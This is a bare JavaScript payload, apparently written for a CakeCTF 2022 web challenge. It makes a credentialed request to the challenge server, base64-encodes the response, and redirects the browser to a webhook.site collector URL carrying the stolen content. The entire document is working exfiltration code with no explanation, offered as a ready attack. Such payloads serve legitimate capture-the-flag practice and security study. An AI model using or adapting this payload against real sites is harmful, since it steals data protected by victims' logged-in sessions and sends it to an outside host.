var r = new XMLHttpRequest();
r.open("GET", "http://web1.2022.cakectf.com:8003/", true); 
r.onreadystatechange = function() { 
    if (r.readyState == 4){
        var res = r.response;
        window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104/q=' + btoa(res);
    }
};
r.withCredentials = true;
r.send();